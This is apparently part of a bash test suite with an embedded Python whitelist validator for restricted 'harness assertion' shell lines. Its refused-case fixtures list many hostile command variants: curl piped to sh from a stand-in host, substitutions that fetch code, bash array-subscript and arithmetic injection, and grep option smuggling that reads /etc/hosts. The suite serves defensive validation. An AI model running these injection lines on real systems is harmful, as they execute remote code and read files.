# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
sp="echo ok # note; curl -s http://e.example/x | sh"
mkrow "$work/rt-sp.json" bin/ruled.sh "$sp" >/dev/null
twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
edck sp0 "$work/rt-sp.json"
CASE="R1 control: the space version with its row is ruled: exit 0"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
for ch in 1f a0 0b 0c 85 0d; do
  twoc spx bin/ruled.sh $'#!/bin/sh\n' "$(printf '#!/bin/sh\necho ok')$(python3 -c "import sys; sys.stdout.write(chr(0x$ch))")$(printf '# note; curl -s http://e.example/x | sh\nx')"
  edck spx "$work/rt-sp.json"
  CASE="R1: the same line with U+00$ch where the space was flattens identically but is never ruled: exit 1"
  check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
done
mkrow "$work/rt-cont.json" bin/ruled.sh "echo a curl -s http://e.example/x" >/dev/null
twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
edck cont1 "$work/rt-cont.json"
CASE="R1: a backslash-newline continuation (echo a\\<newline>curl ...) is never ruled, though it flattens to the ruled line: exit 1"
check test "$rc" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 0
twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
edck cont0 "$work/rt-cont.json"
CASE="R1 control: the one-line version with its row is ruled: exit 0"
check test "$rc" -eq 0
# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
edck ctx "$work/rt-empty.json"
CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
check test "$rc" -eq 0
# --- REQ-SUP-001-AC16, the second allowed row form (advisor, Oct 10): a HARNESS ASSERTION LINE. Its whole grammar is ONE data structure, HARNESS_WHITELIST in
# harness_form.py below (the allowed characters, shape, command words, separators, test operators, grep options, exit statuses, argument names and paths,
# substitutions and double-quoted pattern characters); anything it does not name is refused. In short: t "RULE" "TITLE" bash -c 'BODY' _ "$work/.." "$CALLS"..
# with no expansion of any kind in RULE or TITLE, a SINGLE-QUOTED body (Codex R1) that names the paths only as whole "$1".."$9", no character outside
# printable ASCII and tab (Sonnet R1: a newline), and test / [ limited to file tests, = / != and count comparisons (Sonnet R1: bash 5 evaluates $(...) in
# -v, -R and arithmetic operands). harness_form.py decides a line (exit 0 'harness assertion', exit 1 'refused: why'; --file F reads it from a file).
# Proofs: each refused variant is its own case; the complement enumeration (hf_enum.py) puts every token class outside the whitelist in every position it can
# take; the mutation run widens the whitelist by one token at a time and requires the enumeration to catch it; the runtime proof executes the corpus under
# every bash on PATH (5.x and, where present, 3.2) with a marker-writing curl stub, with plain and hostile argument values.
cat >"$work/harness_form.py" <<'PY'
import re, sys
ALNUM = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
# HARNESS_WHITELIST: the WHOLE grammar of a ruled harness assertion line (REQ-SUP-001-AC16, second row form). Everything not named here is refused.
HARNESS_WHITELIST = {
    "line_chars": "".join(chr(c) for c in range(0x20, 0x7F)) + "\t",   # the line holds only these (no newline, CR, control or non-ASCII character)
    "shape": "t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG...",          # optional leading spaces; ARG... is zero to nine path arguments
    "rule_title_chars": ALNUM + " :-.(),=",                            # RULE and TITLE: no expansion of any kind (no $, backtick, backslash, quote)
    "arg_names": ["work", "CALLS"],                                    # an ARG is "$NAME" or "$NAME/SEG/..." with NAME from this list
    "arg_path_chars": ALNUM + "_.-",                                   # SEG: one or more of these
    "max_args": 9,
    "separators": ["&&", "||", "|", ";"],                              # between the commands of BODY
    "negation": ["!"],                                                 # may precede a command, or a test expression
    "commands": ["grep", "test", "[", "cat", "exit"],                  # the command words of BODY, unquoted
    "pipe_into": ["grep"],                                             # the only command after a |
    "grep_options": ["-E", "-q", "-v", "-Eq"],                         # grep's options: bare words, before end_of_options
    "end_of_options": "--",                                            # REQUIRED: grep OPTION... -- PATTERN ["$N"...] and cat -- "$N" (an operand never reads as an option)
    "pattern_first_char_not": "-",                                     # a double-quoted grep pattern may not start with this
    "grep_bare_patterns": ["."],                                       # the only unquoted grep pattern
    "test_unary": ["-f", "-s", "-e", "-d", "-r"],                      # test / [ : OP X
    "test_string": ["=", "!="],                                        # test / [ : X OP Y
    "test_count": ["-eq", "-ne", "-lt", "-le", "-gt", "-ge"],          # test / [ : N OP N, N = plain digits or the grep count substitution
    "exit_status": ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],  # exit takes exactly one of these
    "positional": "\"$1\" .. \"$9\", whole, at most the number of ARGs", # how BODY names a path: grep's file operands, cat's one operand
    "substitutions": {"grep": "-c", "cat": ""},                        # "$(grep -c OPTION... -- PATTERN "$N")" (a count) and "$(cat -- "$N")", whole and double-quoted
    "dquote_chars": ALNUM + " ^.*:/|()=-",                             # inside a double-quoted BODY word (a pattern)
    "dquote_escapes": ["\\.", "\\[", "\\]"],                         # the only backslash sequences inside a double-quoted BODY word
}
# END HARNESS_WHITELIST
W = HARNESS_WHITELIST
GSUB, CSUB = "\x01G", "\x01C"                              # placeholders: a character outside line_chars can never come from an accepted line
class Refused(Exception): pass
def cls(chars): return "[" + "".join(re.escape(c) for c in chars) + "]"
DQ = '"(?:' + "|".join([cls(W["dquote_chars"])] + [re.escape(e) for e in W["dquote_escapes"]]) + ')*"'
PAT = ('"(?!' + re.escape(W["pattern_first_char_not"]) + ')' + DQ[1:]) if W["pattern_first_char_not"] else DQ   # a pattern word: no leading option character
EOO = (" +" + re.escape(W["end_of_options"])) if W["end_of_options"] else ""
POS = r'"\$([1-9])"'
def alt(xs): return "(?:" + "|".join(re.escape(x) for x in sorted(xs, key=len, reverse=True)) + ")"
SUBS = []
for cmd, lead in W["substitutions"].items():
    extra = ("(?: +" + alt(W["grep_options"]) + ")*" + EOO + " +(?:" + alt(W["grep_bare_patterns"]) + "|" + PAT + ")") if cmd == "grep" else EOO
    SUBS.append((re.compile(r'"\$\(' + re.escape(cmd) + ((" " + re.escape(lead)) if lead else "") + extra + r' "\$([1-9])"\)"'), GSUB if cmd == "grep" else CSUB))
SHAPE = re.compile(r' *t "(' + cls(W["rule_title_chars"]) + r'*)" "(' + cls(W["rule_title_chars"]) + r'*)" bash -c \'([^\']*)\' _((?: +"[^"]*")*)')
ARG = re.compile(r'"\$' + alt(W["arg_names"]) + r'(?:/' + cls(W["arg_path_chars"]) + r'+)*"')
def tokens(body):                                          # [("sep", s)] or [("word", text, kind)]; kind: bare, dq, pos, gsub, csub
    out, i, n = [], 0, len(body)
    seps = sorted(W["separators"], key=len, reverse=True)
    while i < n:
        if body[i] in " \t": i += 1; continue
        s = next((s for s in seps if body.startswith(s, i)), None)
        if s: out.append(("sep", s)); i += len(s); continue
        j = i
        while j < n and body[j] not in " \t" and not any(body.startswith(s, j) for s in seps):
            if body[j] == '"':
                k = body.find('"', j + 1)
                if k < 0: raise Refused("an unterminated double quote in the body")
                j = k + 1
            else: j += 1
        w = body[i:j]; i = j
        if '"' not in w: out.append(("word", w, "bare")); continue
        if not (len(w) >= 2 and w[0] == '"' and w[-1] == '"' and '"' not in w[1:-1]): raise Refused(f"the word {w!r} mixes quoted and unquoted text")
        if w == '"' + GSUB + '"': out.append(("word", w, "gsub")); continue
        if w == '"' + CSUB + '"': out.append(("word", w, "csub")); continue
        m = re.fullmatch(POS, w)
        if m: out.append(("word", m.group(1), "pos")); continue
        if not re.fullmatch(DQ, w): raise Refused(f"the double-quoted word {w!r} holds a character or escape outside dquote_chars / dquote_escapes")
        out.append(("word", w, "dq"))
    return out
def test_expr(args):
    while args and args[0][2] == "bare" and args[0][1] in W["negation"]: args = args[1:]
    operand = lambda a: a[2] in ("dq", "pos", "gsub", "csub") or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    count = lambda a: a[2] == "gsub" or (a[2] == "bare" and re.fullmatch(r"[0-9]+", a[1]))
    if len(args) == 2 and args[0][2] == "bare" and args[0][1] in W["test_unary"] and args[1][2] == "pos": return   # a file test names a positional "$N" only
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_string"] and operand(args[0]) and operand(args[2]): return
    if len(args) == 3 and args[1][2] == "bare" and args[1][1] in W["test_count"] and count(args[0]) and count(args[2]): return
    raise Refused("a test / [ expression outside test_unary (on a positional \"$N\"), test_string and test_count (with their operands)")
def judge(line):
    bad = [c for c in line if c not in W["line_chars"]]
    if bad: raise Refused(f"a character outside the line character set ({bad[0]!r}): bash may read the line differently")
    m = SHAPE.fullmatch(line)
    if not m: raise Refused("not the shape t \"RULE\" \"TITLE\" bash -c 'BODY' _ ARG... (or a RULE / TITLE character outside rule_title_chars)")
    args = re.findall(r' +("[^"]*")', m.group(4))
    if len(args) > W["max_args"]: raise Refused("more path arguments than max_args")
    for a in args:
        if not ARG.fullmatch(a): raise Refused(f"the argument {a} is not \"$NAME\" or \"$NAME/SEG...\" with NAME in arg_names")
    body = m.group(3)
    for rx, ph in SUBS:
        for mm in rx.finditer(body):
            if int(mm.group(1)) > len(args): raise Refused(f"${mm.group(1)} names no argument")
        body = rx.sub('"' + ph + '"', body)
    cmds, cur, seps = [], [], []
    for t in tokens(body):
        if t[0] == "sep": cmds.append(cur); seps.append(t[1]); cur = []
        else: cur.append(t)
    cmds.append(cur)
    for k, c in enumerate(cmds):
        for t in c:
            if t[2] == "pos" and int(t[1]) > len(args): raise Refused(f"${t[1]} names no argument")
        while c and c[0][2] == "bare" and c[0][1] in W["negation"]: c = c[1:]
        if not c: raise Refused("an empty command")
        word, kind, rest = c[0][1], c[0][2], c[1:]
        if kind != "bare" or word not in W["commands"]: raise Refused(f"the command word {word!r} is not in commands (unquoted)")
        if k and seps[k - 1] == "|" and word not in W["pipe_into"]: raise Refused(f"a pipe into {word!r} (pipe_into)")
        if word == "grep":                                 # grep OPTION... -- PATTERN ["$N"...], each word in its role
            i = 0
            while i < len(rest) and rest[i][2] == "bare" and rest[i][1] in W["grep_options"]: i += 1
            if W["end_of_options"]:
                if i >= len(rest) or rest[i][2] != "bare" or rest[i][1] != W["end_of_options"]:
                    raise Refused(f"grep needs its options from grep_options, then {W['end_of_options']} before the pattern (a quoted word is never an option)")
                i += 1
            if i >= len(rest): raise Refused("grep has no pattern")
            p = rest[i]
            if not ((p[2] == "bare" and p[1] in W["grep_bare_patterns"]) or (p[2] == "dq" and not (W["pattern_first_char_not"] and p[1][1:].startswith(W["pattern_first_char_not"])))):
                raise Refused(f"the grep pattern {p[1]!r} is not a double-quoted word that does not start with {W['pattern_first_char_not']!r}, or a bare pattern from grep_bare_patterns")
            for a in rest[i + 1:]:
                if a[2] != "pos": raise Refused(f"the grep file operand {a[1]!r} is not a positional \"$N\"")
        elif word == "test": test_expr(rest)
        elif word == "[":
            if not rest or rest[-1][2] != "bare" or rest[-1][1] != "]": raise Refused("[ without its closing ]")
            test_expr(rest[:-1])
        elif word == "cat":                                # cat -- "$N"
            want = ([("bare", W["end_of_options"])] if W["end_of_options"] else []) + [("pos",)]
            if len(rest) != len(want) or any(a[2] != w[0] or (w[0] == "bare" and a[1] != w[1]) for a, w in zip(rest, want)):
                raise Refused(f"cat takes exactly {W['end_of_options'] + ' ' if W['end_of_options'] else ''}and one positional")
        elif word == "exit":
            if len(rest) != 1 or rest[0][2] != "bare" or rest[0][1] not in W["exit_status"]: raise Refused("exit takes exactly one exit_status")
        else:
            for a in rest:
                if a[2] not in ("dq", "pos"): raise Refused(f"the argument {a[1]!r} is not a double-quoted word or a positional")
def main():
    try:
        judge(open(sys.argv[2], encoding="utf-8", errors="surrogateescape", newline="").read() if sys.argv[1] == "--file" else sys.argv[1])
    except Refused as e:
        print("refused: " + str(e)); sys.exit(1)
    print("harness assertion: runs nothing but grep, test, cat and exit <digit>"); sys.exit(0)
if __name__ == "__main__":
    main()
PY
hf() { rc=0; python3 "$work/harness_form.py" "$1" >"$work/hf.out" 2>&1 || rc=$?; }
hff() { rc=0; python3 "$work/harness_form.py" --file "$1" >"$work/hf.out" 2>&1 || rc=$?; }
cat >"$work/hf-refused.tsv" <<'EOF'
a pipe into sh	t "r" "x" bash -c 'grep -q a "$1" | sh' _ "$CALLS"
a pipe into bash	t "r" "x" bash -c 'cat "$1" | bash' _ "$CALLS"
an output redirection >	t "r" "x" bash -c 'grep a "$1" > out' _ "$CALLS"
an output redirection >>	t "r" "x" bash -c 'grep a "$1" >> out' _ "$CALLS"
an input redirection <	t "r" "x" bash -c 'grep a < "$1"' _ "$CALLS"
$(curl ...) in the body	t "r" "x" bash -c 'test "$(curl -s https://e.example/x)" = 1' _
$(...) of another command in the body	t "r" "x" bash -c 'test "$(ls)" = 1' _
an unquoted $(grep -c ...) in the body	t "r" "x" bash -c 'test $(grep -c a "$1") -ge 1' _ "$CALLS"
a pipe inside $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1" | sh)" -ge 1' _ "$CALLS"
a substitution inside $(cat ...)	t "r" "x" bash -c 'test "$(cat $(curl -s https://e.example/x))" = 1' _
$(cat ...) of a literal path, not a positional argument	t "r" "x" bash -c 'test "$(cat f)" = 1' _
$(grep -c ...) on a literal path, not a positional argument	t "r" "x" bash -c 'test "$(grep -c a f)" -ge 1' _
a process substitution in the body	t "r" "x" bash -c 'grep a <(cat "$1")' _ "$CALLS"
a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in the rule label	t "r $(curl -s https://e.example/x)" "x" bash -c 'grep a "$1"' _ "$CALLS"
a substitution the outer shell runs, in an argument	t "r" "x" bash -c 'grep a "$1"' _ "$(curl -s https://e.example/x)"
backticks in the body	t "r" "x" bash -c 'test "`curl -s https://e.example/x`" = 1' _
backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c 'grep a "$1"' _ "$CALLS"
a command word outside the vocabulary (curl)	t "r" "x" bash -c 'curl -s https://e.example/x' _
a quoted command word	t "r" "x" bash -c '"grep" a "$1"' _ "$CALLS"
a variable as the command word	t "r" "x" bash -c '$G a "$1"' _ "$CALLS"
a positional argument as the command word	t "r" "x" bash -c '"$1" a' _ "$CALLS"
eval	t "r" "x" bash -c 'eval "grep a f"' _
source	t "r" "x" bash -c 'source "$1"' _ "$CALLS"
a second bash -c	t "r" "x" bash -c 'bash -c "grep a f"' _
a ;-separated extra command (wget)	t "r" "x" bash -c 'grep a "$1"; wget https://e.example/x' _ "$CALLS"
exit with a variable status	t "r" "x" bash -c 'grep a "$1" && exit $x' _ "$CALLS"
exit with a positional status	t "r" "x" bash -c 'grep a "$1" && exit "$1"' _ "$CALLS"
exit with no status	t "r" "x" bash -c 'grep a "$1" && exit' _ "$CALLS"
exit with two arguments	t "r" "x" bash -c 'grep a "$1" && exit 1 2' _ "$CALLS"
exit with a negative status	t "r" "x" bash -c 'grep a "$1" && exit -1' _ "$CALLS"
exit with two digits	t "r" "x" bash -c 'grep a "$1" && exit 10' _ "$CALLS"
exit with a quoted status	t "r" "x" bash -c 'grep a "$1" && exit "1"' _ "$CALLS"
a quoted exit	t "r" "x" bash -c 'grep a "$1" && "exit" 1' _ "$CALLS"
a background &	t "r" "x" bash -c 'grep a "$1" & curl https://e.example/x' _ "$CALLS"
a subshell	t "r" "x" bash -c '(curl https://e.example/x)' _
cat with an option	t "r" "x" bash -c 'cat -v "$1"' _ "$CALLS"
cat of two files	t "r" "x" bash -c 'cat "$1" "$1"' _ "$CALLS"
a pipe into anything but grep (tee)	t "r" "x" bash -c 'cat "$1" | tee g' _ "$CALLS"
not the t function	run "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
an unquoted title	t "r" x bash -c 'grep a "$1"' _ "$CALLS"
no rule label	t "x" bash -c 'grep a "$1"' _ "$CALLS"
an empty command between operators	t "r" "x" bash -c 'grep a "$1" && && grep b "$1"' _ "$CALLS"
Codex R1 reproduction: a DOUBLE-quoted body with an outer variable (its value is spliced into the code)	t "r" "x" bash -c "grep -q a '$CALLS'"
a double-quoted body even with no variable	t "r" "x" bash -c "grep -q a f" _
no _ after the body	t "r" "x" bash -c 'grep a "$1"' "$CALLS"
a $0 other than _	t "r" "x" bash -c 'grep a "$1"' x "$CALLS"
an unquoted word after the body	t "r" "x" bash -c 'grep a "$1"' _ curl
a second body after the arguments	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS" bash -c 'curl https://e.example/x'
an argument variable outside the allowlist	t "r" "x" bash -c 'grep a "$1"' _ "$HOME"
an argument with two variables	t "r" "x" bash -c 'grep a "$1"' _ "$work$CALLS"
an argument written ${work}	t "r" "x" bash -c 'grep a "$1"' _ "${work}/rc"
an argument with a variable in the path	t "r" "x" bash -c 'grep a "$1"' _ "$work/$x"
an argument with a glob	t "r" "x" bash -c 'grep a "$1"' _ "$work/*"
a single-quoted argument	t "r" "x" bash -c 'grep a "$1"' _ '$CALLS'
an unquoted argument	t "r" "x" bash -c 'grep a "$1"' _ $CALLS
a literal argument	t "r" "x" bash -c 'grep a "$1"' _ "f"
a positional beyond the arguments	t "r" "x" bash -c 'grep a "$2"' _ "$CALLS"
an unquoted positional	t "r" "x" bash -c 'grep a $1' _ "$CALLS"
"$@" in the body	t "r" "x" bash -c 'grep a "$@"' _ "$CALLS"
"${1}" in the body	t "r" "x" bash -c 'grep a "${1}"' _ "$CALLS"
"$10" in the body	t "r" "x" bash -c 'grep a "$10"' _ "$CALLS"
a positional inside a longer word	t "r" "x" bash -c 'grep a "$1/x"' _ "$CALLS"
a positional glued to another word	t "r" "x" bash -c 'grep a "$1"x' _ "$CALLS"
an inner variable in a double-quoted word	t "r" "x" bash -c 'grep "$HOME" "$1"' _ "$CALLS"
an escaped quote in a double-quoted word	t "r" "x" bash -c 'grep "a\"b" "$1"' _ "$CALLS"
an escaped dollar in a double-quoted word	t "r" "x" bash -c 'grep "a\$b" "$1"' _ "$CALLS"
an unquoted backslash	t "r" "x" bash -c 'grep a\ b "$1"' _ "$CALLS"
Sonnet R1 reproduction 2 (new form): test -v with a literal $(...) array subscript (bash 5 evaluates it)	t "r" "x" bash -c 'test -v "a[\$(curl -s https://e.example/x)]"' _
test -v "a[$(touch X)]" (the substitution runs at expansion)	t "r" "x" bash -c 'test -v "a[$(touch X)]"' _
test -v on a positional argument (its value would be the subscript)	t "r" "x" bash -c 'test -v "$1"' _ "$CALLS"
[ -v "x[$(cmd)]" ]	t "r" "x" bash -c '[ -v "x[$(cmd)]" ]' _
[ -R "x[$(cmd)]" ]	t "r" "x" bash -c '[ -R "x[$(cmd)]" ]' _
-eq with an array-subscript operand	t "r" "x" bash -c '[ "$(cat "$1")" -eq "a[$(cmd)]" ]' _ "$CALLS"
-ge with a positional operand	t "r" "x" bash -c 'test "$1" -ge 0' _ "$CALLS"
a backtick inside a double-quoted pattern	t "r" "x" bash -c 'grep "a`curl -s https://e.example/x`" "$1"' _ "$CALLS"
${x} in a double-quoted pattern	t "r" "x" bash -c 'grep "${x}" "$1"' _ "$CALLS"
${x} unquoted	t "r" "x" bash -c 'grep ${x} "$1"' _ "$CALLS"
$((1+1))	t "r" "x" bash -c 'test $((1+1)) = 2' _
$( inside a grep -c pattern	t "r" "x" bash -c 'test "$(grep -c "a$(curl -s https://e.example/x)" "$1")" -ge 1' _ "$CALLS"
an arithmetic comparison on $(cat ...) (the file's text would be the expression)	t "r" "x" bash -c 'test "$(cat "$1")" -eq 0' _ "$work/evil"
an arithmetic comparison on a quoted word	t "r" "x" bash -c 'test "a" -eq 0' _
an arithmetic comparison on a bare word (a variable name)	t "r" "x" bash -c 'test a -eq 0' _
an arithmetic comparison on an inner variable	t "r" "x" bash -c 'test $x -eq 0' _
test -n	t "r" "x" bash -c 'test -n "$1"' _ "$CALLS"
test -z	t "r" "x" bash -c '[ -z "$1" ]' _ "$CALLS"
test -a (and)	t "r" "x" bash -c 'test -f "$1" -a -f "$1"' _ "$CALLS"
test -o (an option name)	t "r" "x" bash -c 'test -o errexit' _
test with one operand	t "r" "x" bash -c 'test a' _
test with four operands	t "r" "x" bash -c 'test a = b c' _
an operator outside the set (-nt)	t "r" "x" bash -c 'test "$1" -nt "$1"' _ "$CALLS"
a quoted operator	t "r" "x" bash -c 'test a "=" b' _
a quoted unary operator	t "r" "x" bash -c 'test "-f" "$1"' _ "$CALLS"
$[ ] legacy arithmetic	t "r" "x" bash -c 'test $[1+1] = 2' _
$[ ] on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $[A] = 1' _
$(( )) on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $((A)) = 1' _
(( )) arithmetic command	t "r" "x" bash -c 'A=a[\$(cmd)]; ((A))' _
let	t "r" "x" bash -c 'A=a[\$(cmd)]; let A' _
declare -i	t "r" "x" bash -c 'declare -i A; A=a[\$(cmd)]' _
typeset -i	t "r" "x" bash -c 'typeset -i A; A=a[\$(cmd)]' _
local (inside a function)	t "r" "x" bash -c 'f() { local -i A=a[\$(cmd)]; }; f' _
printf -v with a subscript	t "r" "x" bash -c 'printf -v a[\$(cmd)] x' _
read into a subscript	t "r" "x" bash -c 'read a[\$(cmd)] <<< x' _
eval of a word	t "r" "x" bash -c 'eval cmd' _
. (dot) source	t "r" "x" bash -c '. "$1"' _ "$work/f"
an array-subscript assignment	t "r" "x" bash -c 'a[\$(cmd)]=1' _
an array subscript as a test operand	t "r" "x" bash -c 'test a[1] = 1' _
indirect ${!x}	t "r" "x" bash -c 'x=a[\$(cmd)]; test "${!x}" = 1' _
$'...' ANSI-C quotes	t "r" "x" bash -c 'grep $'"'"'\x61'"'"' "$1"' _ "$CALLS"
<( ) process substitution as a grep file	t "r" "x" bash -c 'grep "a" <(cmd)' _
>( ) process substitution	t "r" "x" bash -c 'grep "a" "$1" > >(cmd)' _ "$CALLS"
{a,b} brace expansion in command position	t "r" "x" bash -c '{cmd,x}' _
a glob in command position	t "r" "x" bash -c 'cm?' _
a bracket glob in command position	t "r" "x" bash -c '[c]md' _
a glob as a test operand	t "r" "x" bash -c 'test -f *' _
a glob as a grep pattern	t "r" "x" bash -c 'grep * "$1"' _ "$CALLS"
a here-string <<<	t "r" "x" bash -c 'grep "a" <<< "$1"' _ "$CALLS"
an unquoted grep pattern word	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
$ in the title	t "r" "x $u" bash -c 'grep -q . "$1"' _ "$CALLS"
$[ ] in the title	t "r" "$[1+1]" bash -c 'grep -q . "$1"' _ "$CALLS"
$(( )) in the title	t "r" "$((1+1))" bash -c 'grep -q . "$1"' _ "$CALLS"
${!x} in the rule label	t "r ${!x}" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
$ in the rule label	t "r $x" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
a backslash in the title	t "r" "x \$y" bash -c 'grep -q . "$1"' _ "$CALLS"
an array subscript in an argument path	t "r" "x" bash -c 'grep -q . "$1"' _ "$work/a[1]"
$(( )) in an argument	t "r" "x" bash -c 'grep -q . "$1"' _ "$((1))"
more ARGs than max_args (ten)	t "r" "x" bash -c 'grep -q . "$1"' _ "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS"
grep -vq as one word (the whitelist lists -v and -q, one option per word)	t "r" "x" bash -c 'grep -vq "a" "$1"' _ "$CALLS"
Codex R3 reproduction: a double-quoted --file=... read as a grep OPTION	t "r" "x" bash -c 'grep "--file=/etc/hosts" "$1"' _ "$CALLS"
Codex R3 reproduction: the same inside the count substitution	t "r" "x" bash -c 'test "$(grep -c "--file=/etc/hosts" "$1")" -ge 1' _ "$CALLS"
Sonnet B1: a double-quoted --version	t "r" "x" bash -c 'grep "--version" "$1"' _ "$CALLS"
Sonnet B1: a double-quoted --pager=... in the count substitution	t "r" "x" bash -c 'test "$(grep -c "--pager=touch M" "$1")" -ge 1' _ "$CALLS"
a double-quoted -f	t "r" "x" bash -c 'grep "-f" -- "a" "$1"' _ "$CALLS"
a double-quoted --file=x before --	t "r" "x" bash -c 'grep "--file=x" -- "a" "$1"' _ "$CALLS"
a double-quoted -e with a pattern	t "r" "x" bash -c 'grep "-e" "pat" "$1"' _ "$CALLS"
--regexp=x as the pattern after --	t "r" "x" bash -c 'grep -- "--regexp=x" "$1"' _ "$CALLS"
a double-quoted -r	t "r" "x" bash -c 'grep "-r" -- "a" "$1"' _ "$CALLS"
a double-quoted -E	t "r" "x" bash -c 'grep "-E" -- "a" "$1"' _ "$CALLS"
a pattern that starts with - (even after --)	t "r" "x" bash -c 'grep -- "-a" "$1"' _ "$CALLS"
grep without -- before the pattern	t "r" "x" bash -c 'grep -q "a" "$1"' _ "$CALLS"
grep without -- in the count substitution	t "r" "x" bash -c 'test "$(grep -c "a" "$1")" -ge 1' _ "$CALLS"
-- placed after the pattern	t "r" "x" bash -c 'grep "a" -- "$1"' _ "$CALLS"
a literal file operand	t "r" "x" bash -c 'grep -- "a" "f"' _ "$CALLS"
a second pattern word	t "r" "x" bash -c 'grep -- "a" "b" "$1"' _ "$CALLS"
cat without --	t "r" "x" bash -c 'test "$(cat "$1")" = "a"' _ "$CALLS"
cat -- with a literal operand	t "r" "x" bash -c 'test "$(cat -- "f")" = "a"' _ "$CALLS"
an option after --	t "r" "x" bash -c 'grep -- -v "a" "$1"' _ "$CALLS"
Codex R6: a literal path as a file-test operand	t "r" "x" bash -c 'test -f "/etc/passwd"' _
Codex R6: a cat substitution as a file-test operand	t "r" "x" bash -c 'test -s "$(cat -- "$1")"' _ "$CALLS"
a grep count substitution as a file-test operand	t "r" "x" bash -c '[ -e "$(grep -c -- "a" "$1")" ]' _ "$CALLS"
a double-quoted word as a file-test operand	t "r" "x" bash -c 'test -d "x"' _
a bare number as a file-test operand	t "r" "x" bash -c 'test -r 1' _
a file test with an extra argument	t "r" "x" bash -c 'test -e "$1" x' _ "$CALLS"
a file test on a positional beyond the arguments	t "r" "x" bash -c 'test -f "$2"' _ "$CALLS"
Sonnet R6: cat with two operands	t "r" "x" bash -c 'test "$(cat -- "$1" "$2")" = "a"' _ "$CALLS" "$CALLS"
Sonnet R6: cat with an extra word as a command	t "r" "x" bash -c 'cat -- "$1" EXTRA' _ "$CALLS"
cat with two positionals as a command	t "r" "x" bash -c 'cat -- "$1" "$2"' _ "$CALLS" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: refused ($what): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done <"$work/hf-refused.tsv"
# characters bash reads differently from the parser: anything outside space, tab and printable ASCII (Sonnet R1 reproduction 1: a literal newline in the body)
python3 - "$work" <<'PY'
import sys
w = sys.argv[1]
B = 't "r" "x" bash -c \'grep a "$1"\' _ "$CALLS"'
cases = [
    ("Sonnet R1 reproduction 1: a literal newline in the body (bash runs the text after it as a second command)", 't "r" "x" bash -c \'grep a "$1"\ncurl -s https://e.example/x\' _ "$CALLS"'),
    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
    ("a literal newline in the rule label", B.replace('"r"', '"r\ns"')),
    ("a literal newline after the arguments", B + "\ncurl -s https://e.example/x"),
    ("a carriage return in the body", 't "r" "x" bash -c \'grep a "$1"\rcurl -s https://e.example/x\' _ "$CALLS"'),
    ("a control character (0x01) in the body", B.replace("grep a", "grep a\x01")),
    ("an escape (0x1b) in the title", B.replace('"x"', '"x\x1b[0m"')),
    ("a vertical tab in the body", B.replace("grep a", "grep a\x0bcurl")),
    ("a form feed in the body", B.replace("grep a", "grep a\x0c")),
    ("DEL (0x7f) in the body", B.replace("grep a", "grep a\x7f")),
    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
    ("a non-breaking space in the body", B.replace("grep a", "grep a")),
]
for i, (what, line) in enumerate(cases):
    open("%s/ctl-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
    open("%s/ctl-%02d.what" % (w, i), "w").write(what)
PY
for f in "$work"/ctl-*.txt; do
  hff "$f"
  CASE="AC16 harness form: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done
cat >"$work/hf-accepted.tsv" <<'EOF'
the whole vocabulary	t "r" "x" bash -c 'grep -q -- "a" "$1" && ! grep -E -- "b|c" "$1" || test "$(grep -c -- "a" "$1")" -ge 3; [ "$(cat -- "$1")" = 2 ] | grep -q -- .' _ "$CALLS"
exit with one literal digit	t "r" "x" bash -c 'grep -- "a" "$1" | grep -v -q -- "b" && exit 1; exit 0' _ "$CALLS"
the file tests -f -s -e -d -r and !	t "r" "x" bash -c 'test -f "$1" && [ -s "$1" ] && test -e "$1" && ! test -d "$1" && test ! -d "$1" && [ -r "$1" ]' _ "$CALLS"
